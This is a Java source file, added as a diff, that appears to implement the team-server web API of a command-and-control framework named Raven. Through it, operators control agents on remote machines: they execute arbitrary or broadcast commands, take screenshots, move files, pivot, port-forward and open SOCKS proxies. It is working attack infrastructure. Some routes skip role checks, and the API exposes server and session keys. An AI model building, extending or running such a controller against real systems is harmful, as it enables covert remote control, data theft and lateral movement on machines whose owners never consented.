@@ -1,0 +1,625 @@
+package com.raven.interfaces;
+
+import com.google.gson.Gson;
+import com.raven.core.command.ExportCommand;
+import com.raven.core.database.TeamDatabase;
+import com.raven.core.database.TeamDatabase.OperatorRole;
+import com.raven.core.event.EventManager.EventType;
+import com.raven.core.output.EventLog;
+import com.raven.core.output.Logger;
+import com.raven.core.server.ListenerMode;
+import com.raven.core.server.RavenServer;
+import com.raven.core.session.Session;
+import com.raven.interfaces.APP.api.AuthApi;
+import com.raven.interfaces.APP.api.AuthApi.TokenInfo;
+import com.raven.interfaces.APP.core.HttpRouter;
+import com.raven.interfaces.APP.shared.HttpHelper;
+import com.raven.interfaces.APP.shared.PathResolver;
+import com.raven.utils.ServerConfig;
+import com.raven.utils.SystemHelper;
+import com.sun.net.httpserver.*;
+import java.io.*;
+import java.net.*;
+import java.time.*;
+import java.time.format.DateTimeFormatter;
+import java.util.*;
+import java.util.concurrent.*;
+
+public final class TeamServer {
+
+    private static final long TOKEN_TTL_MS = 8L * 60 * 60 * 1000;
+    private static final int MAX_CHAT = 500;
+    private static final String MEDIA_JSON = "application/json";
+
+    @FunctionalInterface
+    private interface RouteHandler {
+        String Handle(HttpExchange E, TokenInfo T) throws Exception;
+    }
+
+    private final ServerConfig Config;
+    private final ListenerMode Mode;
+    private final TeamDatabase Db;
+    private final AuthApi Auth;
+    private final EventLog Log;
+    private final ExportCommand Export;
+    private final PathResolver PathResolver;
+    private final Map<String, TokenInfo> Tokens = new ConcurrentHashMap<>();
+    private final List<Map<String, Object>> Chat = new CopyOnWriteArrayList<>();
+    private final Gson Json = new Gson();
+
+    private RavenServer Server;
+    private HttpServer HttpSrv;
+    private HttpRouter Router;
+    private Instant ServerStartTime;
+
+    public TeamServer(ServerConfig Config, ListenerMode Mode) {
+        this.Config = Config;
+        this.Mode = Mode;
+        this.Db = TeamDatabase.Connect(Config);
+        this.Auth = new AuthApi(this.Db);
+        this.Log = new EventLog(Config.GetMaxLogEntries());
+        this.Export = new ExportCommand(Db, Log);
+        this.PathResolver = new PathResolver(TeamServer.class);
+    }
+
+    public void Run(String Host, int Port) throws Exception {
+        HttpSrv = HttpServer.create(new InetSocketAddress(Host, Port), 128);
+        Router = new HttpRouter(HttpSrv, Config, PathResolver);
+        RegisterRoutes();
+        HttpSrv.setExecutor(Executors.newFixedThreadPool(32));
+        HttpSrv.start();
+        Logger.Info("TeamServer web panel : http://" + Host + ":" + Port + "/");
+        Logger.Info("API base             : http://" + Host + ":" + Port + "/api/");
+        Log.Add("TeamServer initialized — mode: " + Mode.name());
+    }
+
+    public void Stop() {
+        if (Server != null) Server.StopServer();
+        if (HttpSrv != null) HttpSrv.stop(1);
+        Db.Close();
+        Logger.Shutdown();
+    }
+
+    private void RegisterRoutes() {
+        // auth
+        route("/api/auth/login", this::ApiAuthLogin, false);
+        route("/api/auth/logout", this::ApiAuthLogout, true);
+
+        // server control
+        route("/api/server/status", this::ApiServerStatus, true);
+        route("/api/server/start", this::ApiServerStart, true);
+        route("/api/server/stop", this::ApiServerStop, true);
+
+        // agents
+        route("/api/agents", this::ApiAgents, true);
+        route("/api/agents/kill", this::ApiAgentKill, true);
+        route("/api/agents/note", this::ApiAgentNote, true);
+        route("/api/agents/notes/all", this::ApiAgentNotesAll, true);
+
+        // commands
+        route("/api/command/execute", this::ApiCmdExec, true);
+        route("/api/command/broadcast", this::ApiCmdBroadcast, true);
+        route("/api/command/broadcastall", this::ApiCmdBroadcastAll, true);
+        route("/api/command/history", this::ApiCmdHistory, true);
+        route("/api/command/screenshot", this::ApiCmdScreenshot, true);
+        route("/api/command/download", this::ApiCmdDownload, true);
+        route("/api/command/upload", this::ApiCmdUpload, true);
+        route("/api/command/sleep", this::ApiCmdSleep, true);
+        route("/api/command/pivot", this::ApiCmdPivot, true);
+        route("/api/command/portfwd", this::ApiCmdPortfwd, true);
+        route("/api/command/socks", this::ApiCmdSocks, true);
+
+        // sessions
+        route("/api/sessions/history", this::ApiSessionHistory, true);
+
+        // logs
+        route("/api/logs", this::ApiLogs, true);
+
+        // export
+        route("/api/export", this::ApiExport, true);
+
+        // team — operators
+        route("/api/team/operators", this::ApiOpList, true);
+        route("/api/team/operators/create", this::ApiOpCreate, true);
+        route("/api/team/operators/delete", this::ApiOpDelete, true);
+        route("/api/team/operators/role", this::ApiOpRole, true);
+        route("/api/team/operators/password", this::ApiOpPassword, true);
+        route("/api/team/operators/kick", this::ApiOpKick, true);
+        route("/api/team/roles", this::ApiRoles, true);
+
+        // team — chat
+        route("/api/team/chat/send", this::ApiChatSend, true);
+        route("/api/team/chat/messages", this::ApiChatMessages, true);
+        route("/api/team/chat/logs", this::ApiChatLogs, true);
+
+        Router.RegisterStatic();
+    }
+
+    private void route(String Path, RouteHandler H, boolean Auth) {
+        HttpSrv.createContext(Path, E -> Dispatch(E, H, Auth));
+    }
+
+    private void Dispatch(HttpExchange E, RouteHandler H, boolean RequireAuth) {
+        try {
+            TokenInfo T = null;
+            if (RequireAuth) {
+                String Header = E.getRequestHeaders().getFirst("Authorization");
+                if (Header == null || !Header.startsWith("Bearer ")) {
+                    Respond(E, 401, Map.of("Error", "Unauthorized"));
+                    return;
+                }
+                T = Tokens.get(Header.substring(7));
+                if (T == null || T.ExpiresAt() < System.currentTimeMillis()) {
+                    Respond(E, 401, Map.of("Error", "Token expired or invalid"));
+                    return;
+                }
+            }
+            String Result = H.Handle(E, T);
+            byte[] Bytes = Result.getBytes("UTF-8");
+            E.getResponseHeaders().set("Content-Type", MEDIA_JSON);
+            E.getResponseHeaders().set("X-Content-Type-Options", "nosniff");
+            E.sendResponseHeaders(200, Bytes.length);
+            try (OutputStream Out = E.getResponseBody()) {
+                Out.write(Bytes);
+            }
+        } catch (Exception Ex) {
+            try {
+                Respond(E, 500, Map.of("Error", Ex.getMessage() != null ? Ex.getMessage() : "Internal error"));
+            } catch (Exception Ign) {}
+        }
+    }
+
+    private void Respond(HttpExchange E, int Status, Object Body) throws IOException {
+        byte[] Bytes = HttpHelper.Json(Body).getBytes("UTF-8");
+        E.getResponseHeaders().set("Content-Type", MEDIA_JSON);
+        E.sendResponseHeaders(Status, Bytes.length);
+        try (OutputStream Out = E.getResponseBody()) {
+            Out.write(Bytes);
+        }
+    }
+
+    private Map<String, Object> Body(HttpExchange E) throws Exception {
+        try (InputStream In = E.getRequestBody()) {
+            byte[] Raw = In.readAllBytes();
+            if (Raw.length == 0) return new HashMap<>();
+            @SuppressWarnings("unchecked")
+            Map<String, Object> M = Json.fromJson(new String(Raw, "UTF-8"), Map.class);
+            return M != null ? M : new HashMap<>();
+        }
+    }
+
+    private String S(Map<String, Object> M, String K, String Def) {
+        return HttpHelper.Str(M, K, Def);
+    }
+
+    private int N(Map<String, Object> M, String K, int Def) {
+        return HttpHelper.Num(M, K, Def);
+    }
+
+    private void AddLog(String Msg) {
+        Log.Add(Msg, false);
+        Db.SaveLog(Msg);
+    }
+
+    private String Uptime() {
+        if (ServerStartTime == null) return "00:00:00";
+        return SystemHelper.FormatUptime(Duration.between(ServerStartTime, Instant.now()).getSeconds());
+    }
+
+    //  AUTH
+
+    private String ApiAuthLogin(HttpExchange E, TokenInfo Ignored) throws Exception {
+        Map<String, Object> B = Body(E);
+        String User = S(B, "Username", "");
+        String Pass = S(B, "Password", "");
+        if (User.isEmpty() || Pass.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username and Password required"));
+        if (!Db.ValidateOperator(User, TeamDatabase.HashPassword(Pass))) return HttpHelper.Json(Map.of("Error", "Invalid credentials"));
+        OperatorRole Role = Db.GetOperatorRole(User);
+        Db.UpdateLastSeen(User);
+        String Token = UUID.randomUUID().toString().replace("-", "");
+        Tokens.put(Token, new TokenInfo(User, Role, System.currentTimeMillis() + TOKEN_TTL_MS));
+        Logger.Info("[AUTH] Login: " + User + " [" + Role + "]");
+        AddLog("[AUTH] Login: " + User + " [" + Role + "]");
+        return HttpHelper.Json(Map.of("Token", Token, "Role", Role.name(), "Username", User, "Permissions", Role.PermissionString(), "ExpiresIn", TOKEN_TTL_MS / 1000));
+    }
+
+    private String ApiAuthLogout(HttpExchange E, TokenInfo T) throws Exception {
+        String H = E.getRequestHeaders().getFirst("Authorization");
+        if (H != null && H.startsWith("Bearer ")) {
+            Tokens.remove(H.substring(7));
+            AddLog("[AUTH] Logout: " + T.Username());
+        }
+        return HttpHelper.Json(Map.of("Success", true));
+    }
+
+    //  SERVER
+
+    private String ApiServerStatus(HttpExchange E, TokenInfo T) {
+        boolean Up = Server != null && Server.IsRunning();
+        Map<String, Object> R = new LinkedHashMap<>();
+        R.put("Status", Up ? "Online" : "Offline");
+        R.put("Mode", Mode.name());
+        R.put("Host", Up ? Server.GetHost() : Config.GetServerHost());
+        R.put("Port", Up ? Server.GetPort() : Config.GetServerPort());
+        R.put("Agents", Up ? Server.GetSessions().Count() : 0);
+        R.put("Uptime", Uptime());
+        R.put("Operator", T.Username());
+        R.put("Role", T.Role().name());
+        R.put("Permissions", T.Role().PermissionString());
+        R.put("DbType", Config.GetDatabaseType());
+        R.put("DbOnline", Db.IsConnected());
+        R.put("LogCount", Log.Count());
+        if (Up) R.put("Key", Server.GetKeyBase64());
+        return HttpHelper.Json(R);
+    }
+
+    private String ApiServerStart(HttpExchange E, TokenInfo T) throws Exception {
+        if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
+        if (Server != null && Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server already running"));
+        Map<String, Object> B = Body(E);
+        String Host = S(B, "Host", Config.GetServerHost());
+        int Port = N(B, "Port", Config.GetServerPort());
+        Server = new RavenServer(Host, Port, Mode, Config);
+        Server.AddEventListener(this::OnEvent);
+        if (!Server.StartServer()[0]) return HttpHelper.Json(Map.of("Error", "Failed to start listener"));
+        ServerStartTime = Instant.now();
+        Thread T2 = new Thread(Server::AcceptConnections, "AcceptConnections");
+        T2.setDaemon(true);
+        T2.start();
+        AddLog("Listener started on " + Host + ":" + Port + " by " + T.Username());
+        return HttpHelper.Json(Map.of("Success", true, "Host", Host, "Port", Port));
+    }
+
+    private String ApiServerStop(HttpExchange E, TokenInfo T) {
+        if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
+        if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
+        Server.StopServer();
+        Server = null;
+        ServerStartTime = null;
+        AddLog("Listener stopped by " + T.Username());
+        return HttpHelper.Json(Map.of("Success", true));
+    }
+
+    //  AGENTS
+
+    private String ApiAgents(HttpExchange E, TokenInfo T) {
+        if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Agents", List.of()));
+        List<Map<String, Object>> Agents = new ArrayList<>();
+        for (Session S : Server.GetSessions().GetAll()) {
+            Map<String, Object> A = new LinkedHashMap<>();
+            A.put("ID", S.GetId());
+            A.put("AgentName", S.GetAgentName());
+            A.put("Hostname", S.GetHostname());
+            A.put("OS", S.GetOs());
+            A.put("User", S.GetUser());
+            A.put("Arch", S.GetArch());
+            A.put("AgentIP", S.GetAgentIp());
+            A.put("JoinedAt", S.GetJoinedAt());
+            A.put("Type", S.GetSessionType().name());
+            A.put("ShellMode", S.GetShellMode());
+            A.put("Encrypted", S.IsEncrypted());
+            A.put("MtlsEnabled", S.IsMtlsEnabled());
+            A.put("SessionKey", S.GetSessionKey());
+            A.put("Note", Db.GetAgentNote(S.GetId()));
+            Agents.add(A);
+        }
+        return HttpHelper.Json(Map.of("Agents", Agents, "Count", Agents.size()));
+    }
+
+    private String ApiAgentKill(HttpExchange E, TokenInfo T) throws Exception {
+        if (!T.Role().CanKillSession()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
+        if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
+        int Id = N(Body(E), "AgentId", 0);
+        if (Id == 0) return HttpHelper.Json(Map.of("Error", "AgentId required"));
+        Server.RemoveSession(Id);
+        AddLog("[KILL] session-" + Id + " by " + T.Username());
+        return HttpHelper.Json(Map.of("Success", true));
+    }
+
+    private String ApiAgentNote(HttpExchange E, TokenInfo T) throws Exception {
+        Map<String, Object> B = Body(E);
+        int Id = N(B, "AgentId", 0);
+        String Note = S(B, "Note", "");
+        if (Id == 0) return HttpHelper.Json(Map.of("Error", "AgentId required"));
+        Db.SetAgentNote(Id, Note);
+        return HttpHelper.Json(Map.of("Success", true));
+    }
+
+    private String ApiAgentNotesAll(HttpExchange E, TokenInfo T) {
+        return HttpHelper.Json(Map.of("Notes", Db.GetAllAgentNotes()));
+    }
+
+    //  COMMANDS
+
+    private String ApiCmdExec(HttpExchange E, TokenInfo T) throws Exception {
+        if (!T.Role().CanExecute()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
+        if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
+        Map<String, Object> B = Body(E);
+        int Id = N(B, "AgentId", 0);
+        String Cmd = S(B, "Command", "");
+        if (Id == 0 || Cmd.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Command required"));
+        AddLog("[>] [" + T.Username() + "] session-" + Id + " » " + Cmd);
+        String[] R = Server.ExecuteCommand(Id, Cmd);
+        boolean Ok = Boolean.parseBoolean(R[0]);
+        Db.SaveCommandLog(Id, T.Username(), Cmd, R[1], Ok);
+        return HttpHelper.Json(Map.of("Success", Ok, "Output", R[1], "Command", Cmd));
+    }
+
+    private String ApiCmdBroadcast(HttpExchange E, TokenInfo T) throws Exception {
+        if (!T.Role().CanBroadcast()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
+        if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
+        Map<String, Object> B = Body(E);
+        String Cmd = S(B, "Command", "");
+        if (Cmd.isEmpty()) return HttpHelper.Json(Map.of("Error", "Command required"));
+        @SuppressWarnings("unchecked")
+        List<Object> Raw = (List<Object>) B.getOrDefault("AgentIds", List.of());
+        List<Integer> Ids = new ArrayList<>();
+        for (Object O : Raw)
+            try {
+                Ids.add((int) Double.parseDouble(O.toString()));
+            } catch (Exception Ign) {}
+        if (Ids.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentIds required"));
+        AddLog("[BROADCAST] [" + T.Username() + "] > " + Ids.size() + " agents » " + Cmd);
+        return BuildBroadcastResult(Server.BroadcastCommand(Ids, Cmd), T.Username(), Cmd);
+    }
+
+    private String ApiCmdBroadcastAll(HttpExchange E, TokenInfo T) throws Exception {
+        if (!T.Role().CanBroadcast()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
+        if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
+        String Cmd = S(Body(E), "Command", "");
+        if (Cmd.isEmpty()) return HttpHelper.Json(Map.of("Error", "Command required"));
+        AddLog("[BROADCAST-ALL] [" + T.Username() + "] > " + Server.GetSessions().Count() + " agents » " + Cmd);
+        return BuildBroadcastResult(Server.BroadcastAll(Cmd), T.Username(), Cmd);
+    }
+
+    private String BuildBroadcastResult(Map<Integer, String[]> Results, String Operator, String Cmd) {
+        Map<String, Object> Out = new LinkedHashMap<>();
+        for (Map.Entry<Integer, String[]> En : Results.entrySet()) {
+            boolean Ok = Boolean.parseBoolean(En.getValue()[0]);
+            Out.put(String.valueOf(En.getKey()), Map.of("Success", Ok, "Output", En.getValue()[1]));
+            Db.SaveCommandLog(En.getKey(), Operator, Cmd, En.getValue()[1], Ok);
+        }
+        return HttpHelper.Json(Map.of("Success", true, "Results", Out, "Count", Results.size()));
+    }
+
+    private String ApiCmdScreenshot(HttpExchange E, TokenInfo T) throws Exception {
+        if (!T.Role().CanExecute()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
+        int Id = N(Body(E), "AgentId", 0);
+        if (Id == 0 || Server == null) return HttpHelper.Json(Map.of("Error", "AgentId required"));
+        String[] R = Server.ExecuteCommand(Id, "screenshot");
+        boolean Ok = Boolean.parseBoolean(R[0]);
+        Db.SaveCommandLog(Id, T.Username(), "screenshot", R[1], Ok);
+        return HttpHelper.Json(Map.of("Success", Ok, "Output", R[1]));
+    }
+
+    private String ApiCmdDownload(HttpExchange E, TokenInfo T) throws Exception {
+        if (!T.Role().CanExecute()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
+        Map<String, Object> B = Body(E);
+        int Id = N(B, "AgentId", 0);
+        String Path = S(B, "Path", "");
+        if (Id == 0 || Path.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Path required"));
+        String[] R = Server.ExecuteCommand(Id, "download " + Path);
+        boolean Ok = Boolean.parseBoolean(R[0]);
+        Db.SaveCommandLog(Id, T.Username(), "download " + Path, R[1], Ok);
+        return HttpHelper.Json(Map.of("Success", Ok, "Output", R[1]));
+    }
+
+    private String ApiCmdUpload(HttpExchange E, TokenInfo T) throws Exception {
+        if (!T.Role().CanExecute()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
+        Map<String, Object> B = Body(E);
+        int Id = N(B, "AgentId", 0);
+        String Local = S(B, "LocalPath", "");
+        String Remote = S(B, "RemotePath", "");
+        if (Id == 0 || Local.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and LocalPath required"));
+        String[] R = Server.ExecuteCommand(Id, "upload " + Local + (Remote.isEmpty() ? "" : " " + Remote));
+        boolean Ok = Boolean.parseBoolean(R[0]);
+        Db.SaveCommandLog(Id, T.Username(), "upload " + Local, R[1], Ok);
+        return HttpHelper.Json(Map.of("Success", Ok, "Output", R[1]));
+    }
+
+    private String ApiCmdSleep(HttpExchange E, TokenInfo T) throws Exception {
+        Map<String, Object> B = Body(E);
+        int Id = N(B, "AgentId", 0);
+        String Secs = S(B, "Seconds", "");
+        if (Id == 0 || Secs.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Seconds required"));
+        String[] R = Server.ExecuteCommand(Id, "sleep " + Secs);
+        return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(R[0]), "Output", R[1]));
+    }
+
+    private String ApiCmdPivot(HttpExchange E, TokenInfo T) throws Exception {
+        Map<String, Object> B = Body(E);
+        int Id = N(B, "AgentId", 0);
+        String Target = S(B, "Target", "");
+        if (Id == 0 || Target.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Target required"));
+        String[] R = Server.ExecuteCommand(Id, "pivot " + Target);
+        return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(R[0]), "Output", R[1]));
+    }
+
+    private String ApiCmdPortfwd(HttpExchange E, TokenInfo T) throws Exception {
+        Map<String, Object> B = Body(E);
+        int Id = N(B, "AgentId", 0);
+        int Lport = N(B, "Lport", 0);
+        String Rhost = S(B, "Rhost", "");
+        int Rport = N(B, "Rport", 0);
+        if (Id == 0 || Lport == 0 || Rhost.isEmpty() || Rport == 0) return HttpHelper.Json(Map.of("Error", "AgentId, Lport, Rhost, Rport required"));
+        String[] R = Server.ExecuteCommand(Id, "portfwd " + Lport + " " + Rhost + " " + Rport);
+        return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(R[0]), "Output", R[1]));
+    }
+
+    private String ApiCmdSocks(HttpExchange E, TokenInfo T) throws Exception {
+        Map<String, Object> B = Body(E);
+        int Id = N(B, "AgentId", 0);
+        int Lport = N(B, "Lport", 0);
+        if (Id == 0 || Lport == 0) return HttpHelper.Json(Map.of("Error", "AgentId and Lport required"));
+        String[] R = Server.ExecuteCommand(Id, "socks " + Lport);
+        return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(R[0]), "Output", R[1]));
+    }
+
+    private String ApiCmdHistory(HttpExchange E, TokenInfo T) throws Exception {
+        Map<String, Object> B = Body(E);
+        return HttpHelper.Json(Map.of("History", Db.GetCommandHistory(N(B, "AgentId", 0), N(B, "Limit", 100))));
+    }
+
+    //  SESSIONS
+
+    private String ApiSessionHistory(HttpExchange E, TokenInfo T) throws Exception {
+        int Limit = N(Body(E), "Limit", 100);
+        return HttpHelper.Json(Map.of("Sessions", Db.GetSessionHistory(Math.min(Limit, 1000))));
+    }
+
+    //  LOGS
+
+    private String ApiLogs(HttpExchange E, TokenInfo T) {
+        return HttpHelper.Json(Map.of("Logs", Log.GetAll(), "Count", Log.Count()));
+    }
+
+    //  EXPORT
+
+    private String ApiExport(HttpExchange E, TokenInfo T) throws Exception {
+        Map<String, Object> B = Body(E);
+        String Target = S(B, "Target", "");
+        String Format = S(B, "Format", "json");
+        if (Target.isEmpty()) return HttpHelper.Json(Map.of("Error", "Target required"));
+        Export.Run(Target, Format);
+        return HttpHelper.Json(Map.of("Success", true, "Target", Target, "Format", Format));
+    }
+
+    //  OPERATORS
+
+    private String ApiOpList(HttpExchange E, TokenInfo T) {
+        if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
+        return HttpHelper.Json(Map.of("Operators", Db.GetOperators()));
+    }
+
+    private String ApiOpCreate(HttpExchange E, TokenInfo T) throws Exception {
+        if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
+        Map<String, Object> B = Body(E);
+        String User = S(B, "Username", "");
+        String Pass = S(B, "Password", "");
+        String Role = S(B, "Role", "OPERATOR");
+        if (User.isEmpty() || Pass.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username and Password required"));
+        if (Pass.length() < 8) return HttpHelper.Json(Map.of("Error", "Password must be at least 8 characters"));
+        OperatorRole R = OperatorRole.FromString(Role);
+        if (R == OperatorRole.SUPER && !T.Role().IsSuperAdmin()) return HttpHelper.Json(Map.of("Error", "Only SUPER can create SUPER"));
+        if (!Db.CreateOperator(User, TeamDatabase.HashPassword(Pass), R)) return HttpHelper.Json(Map.of("Error", "Username already exists"));
+        AddLog("[TEAM] Created operator: " + User + " [" + R + "] by " + T.Username());
+        return HttpHelper.Json(Map.of("Success", true, "Username", User, "Role", R.name()));
+    }
+
+    private String ApiOpDelete(HttpExchange E, TokenInfo T) throws Exception {
+        if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
+        String User = S(Body(E), "Username", "");
+        if (User.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username required"));
+        if (User.equalsIgnoreCase(Config.GetAdminUsername())) return HttpHelper.Json(Map.of("Error", "Cannot delete admin"));
+        if (!Db.DeleteOperator(User)) return HttpHelper.Json(Map.of("Error", "Operator not found"));
+        AddLog("[TEAM] Deleted operator: " + User + " by " + T.Username());
+        return HttpHelper.Json(Map.of("Success", true));
+    }
+
+    private String ApiOpRole(HttpExchange E, TokenInfo T) throws Exception {
+        if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
+        Map<String, Object> B = Body(E);
+        String User = S(B, "Username", "");
+        String Role = S(B, "Role", "");
+        if (User.isEmpty() || Role.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username and Role required"));
+        if (User.equalsIgnoreCase(Config.GetAdminUsername())) return HttpHelper.Json(Map.of("Error", "Cannot change admin role"));
+        OperatorRole R = OperatorRole.FromString(Role);
+        if (!Db.UpdateOperatorRole(User, R)) return HttpHelper.Json(Map.of("Error", "Operator not found"));
+        AddLog("[TEAM] Role updated: " + User + " → " + R + " by " + T.Username());
+        return HttpHelper.Json(Map.of("Success", true));
+    }
+
+    private String ApiOpPassword(HttpExchange E, TokenInfo T) throws Exception {
+        if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
+        Map<String, Object> B = Body(E);
+        String User = S(B, "Username", "");
+        String Pass = S(B, "Password", "");
+        if (User.isEmpty() || Pass.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username and Password required"));
+        if (Pass.length() < 8) return HttpHelper.Json(Map.of("Error", "Password must be at least 8 characters"));
+        if (!Db.UpdateOperatorPassword(User, TeamDatabase.HashPassword(Pass))) return HttpHelper.Json(Map.of("Error", "Operator not found"));
+        AddLog("[TEAM] Password changed: " + User + " by " + T.Username());
+        return HttpHelper.Json(Map.of("Success", true));
+    }
+
+    private String ApiOpKick(HttpExchange E, TokenInfo T) throws Exception {
+        if (!T.Role().CanKickOperator()) return HttpHelper.Json(Map.of("Error", "SUPER role required"));
+        String User = S(Body(E), "Username", "");
+        if (User.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username required"));
+        if (User.equalsIgnoreCase(Config.GetAdminUsername())) return HttpHelper.Json(Map.of("Error", "Cannot kick admin"));
+        if (User.equals(T.Username())) return HttpHelper.Json(Map.of("Error", "Cannot kick yourself"));
+        Tokens.entrySet().removeIf(En -> En.getValue().Username().equals(User));
+        if (!Db.DeleteOperator(User)) return HttpHelper.Json(Map.of("Error", "Operator not found"));
+        AddLog("[TEAM] Kicked: " + User + " by " + T.Username());
+        return HttpHelper.Json(Map.of("Success", true));
+    }
+
+    private String ApiRoles(HttpExchange E, TokenInfo T) {
+        List<Map<String, Object>> Roles = new ArrayList<>();
+        for (OperatorRole R : OperatorRole.values()) {
+            Map<String, Object> M = new LinkedHashMap<>();
+            M.put("Name", R.name());
+            M.put("Permissions", R.PermissionString());
+            M.put("CanExec", R.CanExecute());
+            M.put("CanWrite", R.CanWrite());
+            M.put("CanRead", R.CanRead());
+            M.put("CanKill", R.CanKillSession());
+            M.put("CanManage", R.CanManage());
+            M.put("CanKick", R.CanKickOperator());
+            M.put("IsSuper", R.IsSuperAdmin());
+            Roles.add(M);
+        }
+        return HttpHelper.Json(Map.of("Roles", Roles));
+    }
+
+    //  CHAT
+
+    private String ApiChatSend(HttpExchange E, TokenInfo T) throws Exception {
+        Map<String, Object> B = Body(E);
+        String Msg = S(B, "Message", "");
+        String To = S(B, "To", "all");
+        if (Msg.isEmpty()) return HttpHelper.Json(Map.of("Error", "Message required"));
+        Map<String, Object> Entry = new LinkedHashMap<>();
+        Entry.put("From", T.Username());
+        Entry.put("To", To);
+        Entry.put("Message", Msg);
+        Entry.put("Time", LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss")));
+        Chat.add(Entry);
+        if (Chat.size() > MAX_CHAT) Chat.remove(0);
+        Db.SaveChatLog(T.Username(), To, Msg);
+        return HttpHelper.Json(Map.of("Success", true));
+    }
+
+    private String ApiChatMessages(HttpExchange E, TokenInfo T) throws Exception {
+        String User = T.Username();
+        List<Map<String, Object>> Visible = new ArrayList<>();
+        for (Map<String, Object> M : Chat) {
+            String To = M.getOrDefault("To", "all").toString();
+            String From = M.getOrDefault("From", "").toString();
+            if (To.equals("all") || To.equals(User) || From.equals(User)) Visible.add(M);
+        }
+        return HttpHelper.Json(Map.of("Messages", Visible, "Count", Visible.size()));
+    }
+
+    private String ApiChatLogs(HttpExchange E, TokenInfo T) throws Exception {
+        int Limit = N(Body(E), "Limit", 100);
+        return HttpHelper.Json(Map.of("Logs", Db.GetChatLogs(Math.min(Limit, 1000))));
+    }
+
+    //  EVENTS
+
+    private void OnEvent(EventType Type, Map<String, Object> Data) {
+        switch (Type) {
+            case ServerStarted -> AddLog("Listener started on " + Data.get("Host") + ":" + Data.get("Port"));
+            case AgentConnected -> {
+                AddLog("[+] session-" + Data.get("ID") + " [" + Data.get("Type") + "] " + Data.get("User") + "@" + Data.get("Hostname") + " " + Data.get("OS") + " key=" + Data.get("SessionKey"));
+                Db.SaveSessionEvent(Data, "connected");
+            }
+            case AgentDisconnected -> {
+                AddLog("[-] session-" + Data.get("ID") + " disconnected: " + Data.get("Reason"));
+                Db.SaveSessionEvent(Data, "disconnected");
+            }
+            case AgentRemoved -> AddLog("[-] session-" + Data.get("ID") + " removed");
+            case Error -> AddLog("[!] " + Data.get("Message"));
+        }
+    }
+}
